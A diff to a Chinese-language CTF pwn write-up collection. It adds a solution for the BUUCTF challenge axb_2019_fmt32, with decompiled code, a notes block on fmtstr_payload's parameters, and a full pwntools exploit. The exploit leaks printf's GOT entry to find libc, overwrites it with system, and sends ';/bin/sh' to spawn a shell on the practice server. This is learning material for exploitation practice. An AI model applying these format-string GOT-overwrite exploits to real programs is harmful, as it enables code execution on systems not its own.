@@ -375,7 +375,7 @@ ssize_t __cdecl sub_80487D0(char a1)
 
 而用IDA查看了，没有后面函数，就要用ret2libc了
 exp:
-```python 
+```python
 from pwn import *
 from LibcSearcher import *
 r=remote('node5.buuoj.cn',25080)
@@ -686,6 +686,14 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 那么这个偏移量有什么用呢，下面就必须分析一个超级牛逼的函数：
 fmtstr_payload(offset,writes)
 这个函数还有一些其他参数，但是由于这道题不需要知道那么多，所以知道这两个参数怎么用就可以了，第一个参数就是偏移量，就是我们上面得到的结果，他的值是11.第二个就非常牛逼了，它是一个字典，它的键是地址，然后值可以任意，最后可以将对应地址的值改为这个任意值。
+```bash
+fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)
+第一个参数表示格式化字符串的偏移
+第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:systemAddress}；
+第三个参数表示已经输出的字符个数
+第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写
+
+```
 ![alt text](image-21.png)
 exp：
 ```python
@@ -702,3 +710,103 @@ r.sendline(payload)
 r.interactive()
 ```
 原理看这个[格式化字符串漏洞原理及其利用（附带pwn例题讲解）](https://blog.csdn.net/qq_73985089/article/details/137199087?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522c033af0c7c8af025b367d901cdc821e4%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=c033af0c7c8af025b367d901cdc821e4&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-137199087-null-null.142^v102^pc_search_result_base5&utm_term=%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187)
+
+## axb_2019_fmt32
+
+>知识点：格式化字符串漏洞
+
+![](image-22.png)
+
+IDA看看
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  char s[257]; // [esp+Fh] [ebp-239h] BYREF
+  char format[300]; // [esp+110h] [ebp-138h] BYREF
+  unsigned int v5; // [esp+23Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  setbuf(stdout, 0);
+  setbuf(stdin, 0);
+  setbuf(stderr, 0);
+  puts(
+    "Hello,I am a computer Repeater updated.\n"
+    "After a lot of machine learning,I know that the essence of man is a reread machine!");
+  puts("So I'll answer whatever you say!");
+  while ( 1 )
+  {
+    alarm(3u);
+    memset(s, 0, sizeof(s));
+    memset(format, 0, sizeof(format));
+    printf("Please tell me:");
+    read(0, s, 0x100u);
+    sprintf(format, "Repeater:%s\n", s);
+    if ( strlen(format) > 0x10E )
+      break;
+    printf(format);
+  }
+  printf("what you input is really long!");
+  exit(0);
+}
+```
+做格式化第一步先计算偏移量
+![alt text](image-23.png)
+很容易发现偏移量为8
+因为这个并没有什么后门函数，所以要自己去泄漏libc地址
+```bash
+payload = 'A' + p32(printf_got)+ 'B' + '%8$s'
+#‘A’  是用来补位的，这样后面的printf函数的got表地址就会在栈上相对距离为8的位置
+#‘B’  相当于标记位，下面在接收数据的时候，接收到字符‘B’,后面跟着的就是我们泄露出来的函数地址  
+#%8$s  利用格式化字符串漏洞的%8$s去泄露出栈上相对距离为8的地址上的值
+```
+![alt text](image-24.png)
+得到libc基址
+```python
+payload = 'A' + p32(printf_got)+ 'B' + '%8$s'
+r.sendafter("Please tell me:",payload)
+
+r.recvuntil('B')
+printf_addr = u32(sh.recv(4))
+print(hex(printf_addr))
+
+libc = LibcSearcher('printf', printf_addr)
+libcbase = printf_addr - libc.dump('printf')
+system_addr = libcbase + libc.dump('system')
+```
+接下来利用fmtstr_payload，将printf地址修改为system地址
+```bash
+payload='a'+fmtstr_payload(8,{printf_got:system},write_size = "byte",numbwritten = 0xa)
+```
+0xa=1(即payload上的a)+9(Repeater:字符串的长度)
+之后传入 ‘/bin/sh’ 即可以获取shell
+exp：
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(os='linux',arch='i386',log_level='debug')
+
+r = remote("node5.buuoj.cn","29802")
+elf=ELF("./4")
+
+printf_got = elf.got['printf']
+
+payload =b'a' + p32(printf_got) +b'22'+ b'%8$s'
+r.sendafter('me:', payload)
+r.recvuntil("22")
+printf_addr = u32(r.recv(4))
+
+libc=LibcSearcher('printf',printf_addr)
+
+libc_base=printf_addr-libc.dump('printf')
+system=libc_base+libc.dump('system')
+
+
+payload=b'a'+fmtstr_payload(8,{printf_got:system},write_size = "byte",numbwritten = 0xa)
+#p.recvuntil(':')
+r.sendline(payload)
+
+r.sendline(';/bin/sh\x00')
+r.interactive()
+```
+[pwn格式化字符串漏洞](https://www.anquanke.com/post/id/253647#h2-1)
